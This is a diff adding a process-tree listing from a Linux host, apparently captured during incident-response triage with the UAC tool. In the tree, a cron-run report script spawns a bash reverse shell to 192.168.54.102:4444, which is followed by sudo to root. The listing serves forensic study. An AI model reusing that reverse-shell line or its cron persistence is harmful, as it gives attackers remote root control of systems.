@@ -1,0 +1,274 @@
+systemd splash
+  |-ModemManager
+  |   `-3*[{ModemManager}]
+  |-NetworkManager --no-daemon
+  |   `-3*[{NetworkManager}]
+  |-VBoxService
+  |   `-8*[{VBoxService}]
+  |-accounts-daemon
+  |   `-3*[{accounts-daemon}]
+  |-apache2 -k start
+  |   |-apache2 -k start
+  |   |-apache2 -k start
+  |   |-apache2 -k start
+  |   |-apache2 -k start
+  |   |-apache2 -k start
+  |   |-apache2 -k start
+  |   |-apache2 -k start
+  |   |-apache2 -k start
+  |   |-apache2 -k start
+  |   `-apache2 -k start
+  |-avahi-daemon
+  |   `-avahi-daemon
+  |-colord
+  |   `-3*[{colord}]
+  |-cron -f -L 0
+  |   |-cron -f -L 0
+  |   |   `-sh -c /opt/company/scripts/generate_reports.sh
+  |   |       `-generate_report /opt/company/scripts/generate_reports.sh
+  |   |           `-bash -c bash -i >& /dev/tcp/192.168.54.102/4444 0>&1
+  |   |               `-bash -i
+  |   `-cron -f -L 0
+  |       `-sh -c /opt/company/scripts/generate_reports.sh
+  |           `-generate_report /opt/company/scripts/generate_reports.sh
+  |               `-bash -c bash -i >& /dev/tcp/192.168.54.102/4444 0>&1
+  |                   `-bash -i
+  |                       `-sudo -i
+  |                           `-bash
+  |-cups-browsed
+  |   `-3*[{cups-browsed}]
+  |-cupsd -l
+  |-dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+  |-fwupd
+  |   `-5*[{fwupd}]
+  |-gdm3
+  |   |-gdm-session-wor
+  |   |   |-gdm-wayland-ses env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --session=ubuntu
+  |   |   |   |-gnome-session-b --session=ubuntu
+  |   |   |   |   `-3*[{gnome-session-b}]
+  |   |   |   `-3*[{gdm-wayland-ses}]
+  |   |   `-3*[{gdm-session-wor}]
+  |   `-3*[{gdm3}]
+  |-gnome-remote-de --system
+  |   `-3*[{gnome-remote-de}]
+  |-iwlwifi-5000-5.
+  |   `-4*[{iwlwifi-5000-5.}]
+  |-kerneloops --test
+  |-kerneloops
+  |-php-fpm8.3
+  |   |-php-fpm8.3
+  |   `-php-fpm8.3
+  |-polkitd --no-debug
+  |   `-3*[{polkitd}]
+  |-power-profiles-
+  |   `-3*[{power-profiles-}]
+  |-rsyslogd -n -iNONE
+  |   `-3*[{rsyslogd}]
+  |-rtkit-daemon
+  |   `-2*[{rtkit-daemon}]
+  |-snapd
+  |   `-8*[{snapd}]
+  |-switcheroo-cont
+  |   `-3*[{switcheroo-cont}]
+  |-systemd --user
+  |   |-(sd-pam)
+  |   |-dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+  |   |-snapd-desktop-i
+  |   |   `-snapd-desktop-i
+  |   |       `-3*[{snapd-desktop-i}]
+  |   |-xdg-document-po
+  |   |   |-fusermount3 -o rw,nosuid,nodev,fsname=portal,auto_unmount,subtype=portal -- /run/user/0/doc
+  |   |   `-6*[{xdg-document-po}]
+  |   `-xdg-permission-
+  |       `-3*[{xdg-permission-}]
+  |-systemd --user
+  |   |-(sd-pam)
+  |   |-at-spi2-registr --use-gnome-session
+  |   |   `-3*[{at-spi2-registr}]
+  |   |-crashhelper 2906 9 /tmp/ 11
+  |   |   `-{crashhelper}
+  |   |-dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+  |   |-dconf-service
+  |   |   `-3*[{dconf-service}]
+  |   |-evolution-addre
+  |   |   `-6*[{evolution-addre}]
+  |   |-evolution-calen
+  |   |   `-9*[{evolution-calen}]
+  |   |-evolution-sourc
+  |   |   `-4*[{evolution-sourc}]
+  |   |-gcr-ssh-agent --base-dir /run/user/1000/gcr
+  |   |   `-2*[{gcr-ssh-agent}]
+  |   |-gjs -m /usr/share/gnome-shell/org.gnome.Shell.Notifications
+  |   |   `-5*[{gjs}]
+  |   |-gjs -m /usr/share/gnome-shell/org.gnome.ScreenSaver
+  |   |   `-5*[{gjs}]
+  |   |-gnome-keyring-d --foreground --components=pkcs11,secrets --control-directory=/run/user/1000/keyring
+  |   |   `-4*[{gnome-keyring-d}]
+  |   |-gnome-session-b --systemd-service --session=ubuntu
+  |   |   |-at-spi-bus-laun --launch-immediately
+  |   |   |   |-dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 11...
+  |   |   |   `-4*[{at-spi-bus-laun}]
+  |   |   |-evolution-alarm
+  |   |   |   `-7*[{evolution-alarm}]
+  |   |   |-gsd-disk-utilit
+  |   |   |   `-3*[{gsd-disk-utilit}]
+  |   |   |-update-notifier
+  |   |   |   `-5*[{update-notifier}]
+  |   |   `-4*[{gnome-session-b}]
+  |   |-gnome-session-c --monitor
+  |   |   `-{gnome-session-c}
+  |   |-gnome-shell
+  |   |   |-Xwayland :0 -rootless -noreset -accessx -core -auth /run/user/1000/.mutter-Xwaylandauth.7QTFG3 -listenfd 4 ...
+  |   |   |-firefox
+  |   |   |   |-forkserver -contentproc -ipcHandle 0 -signalPipe 1 -initialChannelId{ca6a72ff-4fc0-4b33-babd-453649
+  |   |   |   |   |-Isolated Web Co
+  |   |   |   |   |   `-15*[{Isolated Web Co}]
+  |   |   |   |   |-Privileged Cont
+  |   |   |   |   |   `-17*[{Privileged Cont}]
+  |   |   |   |   |-RDD Process
+  |   |   |   |   |   `-4*[{RDD Process}]
+  |   |   |   |   |-Socket Process
+  |   |   |   |   |   `-5*[{Socket Process}]
+  |   |   |   |   |-Utility Process
+  |   |   |   |   |   `-4*[{Utility Process}]
+  |   |   |   |   |-Web Content
+  |   |   |   |   |   `-14*[{Web Content}]
+  |   |   |   |   |-Web Content
+  |   |   |   |   |   `-14*[{Web Content}]
+  |   |   |   |   |-Web Content
+  |   |   |   |   |   `-14*[{Web Content}]
+  |   |   |   |   `-WebExtensions
+  |   |   |   |       `-15*[{WebExtensions}]
+  |   |   |   `-67*[{firefox}]
+  |   |   |-gjs /usr/share/gnome-shell/extensions/ding@rastersoft.com/app/ding.js -E -P...
+  |   |   |   `-8*[{gjs}]
+  |   |   |-mutter-x11-fram
+  |   |   |   `-10*[{mutter-x11-fram}]
+  |   |   `-16*[{gnome-shell}]
+  |   |-gnome-shell-cal
+  |   |   `-6*[{gnome-shell-cal}]
+  |   |-gnome-terminal /usr/bin/gnome-terminal --wait
+  |   |   `-gnome-terminal. --wait
+  |   |       `-4*[{gnome-terminal.}]
+  |   |-gnome-terminal-
+  |   |   |-bash
+  |   |   |   `-systemctl status apache2
+  |   |   |       `-pager
+  |   |   |-bash
+  |   |   |-bash
+  |   |   |-bash
+  |   |   |   `-sudo ./uac -p ir_triage /tmp
+  |   |   |       `-sudo ./uac -p ir_triage /tmp
+  |   |   |           `-uac ./uac -p ir_triage /tmp
+  |   |   |               `-uac ./uac -p ir_triage /tmp
+  |   |   |                   `-pstree -a
+  |   |   `-6*[{gnome-terminal-}]
+  |   |-goa-daemon
+  |   |   `-4*[{goa-daemon}]
+  |   |-goa-identity-se
+  |   |   `-3*[{goa-identity-se}]
+  |   |-gsd-a11y-settin
+  |   |   `-4*[{gsd-a11y-settin}]
+  |   |-gsd-color
+  |   |   `-4*[{gsd-color}]
+  |   |-gsd-datetime
+  |   |   `-4*[{gsd-datetime}]
+  |   |-gsd-housekeepin
+  |   |   `-4*[{gsd-housekeepin}]
+  |   |-gsd-keyboard
+  |   |   `-4*[{gsd-keyboard}]
+  |   |-gsd-media-keys
+  |   |   `-4*[{gsd-media-keys}]
+  |   |-gsd-power
+  |   |   `-4*[{gsd-power}]
+  |   |-gsd-print-notif
+  |   |   `-3*[{gsd-print-notif}]
+  |   |-gsd-printer
+  |   |   `-3*[{gsd-printer}]
+  |   |-gsd-rfkill
+  |   |   `-3*[{gsd-rfkill}]
+  |   |-gsd-screensaver
+  |   |   `-3*[{gsd-screensaver}]
+  |   |-gsd-sharing
+  |   |   `-4*[{gsd-sharing}]
+  |   |-gsd-smartcard
+  |   |   `-4*[{gsd-smartcard}]
+  |   |-gsd-sound
+  |   |   `-4*[{gsd-sound}]
+  |   |-gsd-wacom
+  |   |   `-4*[{gsd-wacom}]
+  |   |-gsd-xsettings
+  |   |   `-4*[{gsd-xsettings}]
+  |   |-gvfs-afc-volume
+  |   |   `-4*[{gvfs-afc-volume}]
+  |   |-gvfs-goa-volume
+  |   |   `-3*[{gvfs-goa-volume}]
+  |   |-gvfs-gphoto2-vo
+  |   |   `-3*[{gvfs-gphoto2-vo}]
+  |   |-gvfs-mtp-volume
+  |   |   `-3*[{gvfs-mtp-volume}]
+  |   |-gvfs-udisks2-vo
+  |   |   `-4*[{gvfs-udisks2-vo}]
+  |   |-gvfsd
+  |   |   |-gvfsd-recent --spawner :1.20 /org/gtk/gvfs/exec_spaw/1
+  |   |   |   `-3*[{gvfsd-recent}]
+  |   |   |-gvfsd-trash --spawner :1.20 /org/gtk/gvfs/exec_spaw/0
+  |   |   |   `-4*[{gvfsd-trash}]
+  |   |   `-3*[{gvfsd}]
+  |   |-gvfsd-fuse /run/user/1000/gvfs -f
+  |   |   `-6*[{gvfsd-fuse}]
+  |   |-gvfsd-metadata
+  |   |   `-3*[{gvfsd-metadata}]
+  |   |-ibus-daemon --panel disable
+  |   |   |-ibus-engine-sim
+  |   |   |   `-3*[{ibus-engine-sim}]
+  |   |   |-ibus-extension-
+  |   |   |   `-4*[{ibus-extension-}]
+  |   |   |-ibus-memconf
+  |   |   |   `-3*[{ibus-memconf}]
+  |   |   `-3*[{ibus-daemon}]
+  |   |-ibus-portal
+  |   |   `-3*[{ibus-portal}]
+  |   |-ibus-x11
+  |   |   `-3*[{ibus-x11}]
+  |   |-pipewire
+  |   |   `-2*[{pipewire}]
+  |   |-pipewire -c filter-chain.conf
+  |   |   `-2*[{pipewire}]
+  |   |-pipewire-pulse
+  |   |   `-2*[{pipewire-pulse}]
+  |   |-sh -c /usr/bin/nautilus --gapplication-service
+  |   |   `-nautilus --gapplication-service
+  |   |       `-11*[{nautilus}]
+  |   |-snap userd
+  |   |   `-7*[{snap}]
+  |   |-snapd-desktop-i
+  |   |   `-snapd-desktop-i
+  |   |       `-4*[{snapd-desktop-i}]
+  |   |-tracker-miner-f
+  |   |   `-7*[{tracker-miner-f}]
+  |   |-wireplumber
+  |   |   `-5*[{wireplumber}]
+  |   |-xdg-desktop-por
+  |   |   `-6*[{xdg-desktop-por}]
+  |   |-xdg-desktop-por
+  |   |   `-5*[{xdg-desktop-por}]
+  |   |-xdg-desktop-por
+  |   |   `-4*[{xdg-desktop-por}]
+  |   |-xdg-document-po
+  |   |   |-fusermount3 -o rw,nosuid,nodev,fsname=portal,auto_unmount,subtype=portal -- /run/user/1000/doc
+  |   |   `-6*[{xdg-document-po}]
+  |   `-xdg-permission-
+  |       `-3*[{xdg-permission-}]
+  |-systemd-journal
+  |-systemd-logind
+  |-systemd-oomd
+  |-systemd-resolve
+  |-systemd-udevd
+  |-udisksd
+  |   `-5*[{udisksd}]
+  |-unattended-upgr /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+  |   `-{unattended-upgr}
+  |-upowerd
+  |   `-3*[{upowerd}]
+  `-wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev
